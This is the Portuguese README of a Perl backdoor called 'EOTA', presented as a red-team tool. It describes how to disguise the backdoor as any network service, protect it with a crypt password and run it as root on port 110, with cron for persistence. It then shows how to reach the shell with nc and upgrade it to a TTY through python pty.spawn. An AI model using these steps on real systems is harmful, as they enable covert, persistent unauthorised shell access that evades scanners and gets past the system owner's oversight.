# EOTA
Este script é uma backdoor ''' Perl ''' projetada para equipes vermelhas e que funciona como um serviço/porta qualquer que voce desejar.
A backdoor informar qualquer programa de mapeamento de rede que ele é um serviço determinado pelo orquestrador da ferramenta.
Por favor modifique o codigo fonte da ferramenta para personalização.

#### obs: Necessario modificação para implementar criptografia no trafego.

## VARIAVEIS 
* $service = Utilizada como banner para ser exibido aos scanners.

* $sec = Esta é uma senha para utilizar a backdoor, não queros xeretas xeretando, utilize o perl para gerar a senha:<br/>
perl -e 'print crypt ("PASSWORD","salto")'<br/>
Modifique o PASSWORD para a senha e o SALTO para o salto utilizado na senha.

* $acs = Modifique esta variavel para controle de shell , por default utilizamos o /bin/bash.

## DICA:
EOTA foi projetado para ser utilizado com um arquivo CRON, seu banner exibe as configuracoes necessarias para esta feature funcionar.

## EXECUTANDO
Para executar EOTA voce precisará de acesso root ao sistema, depois execute os seguintes comandos:

>$ git clone https://github.com/Outs1d3r-Net/PERL.git<br/>
>$ cd PERL
>$ chmod a+x EOTA.pl
>$ perl ./EOTA.pl 110 & 2>&1

## CONECTANDO
>$ nc IP_alvo 110
>PASSWORD
>id

## TTY
Se voce precisar de um TTY voce verificar com o python por exemplo para obter uma linha de comando mais interativa:<br/>
>which python<br/>
>/usr/bin/python2 -c 'import pty;pty.spawn("/bin/bash")'<br/>
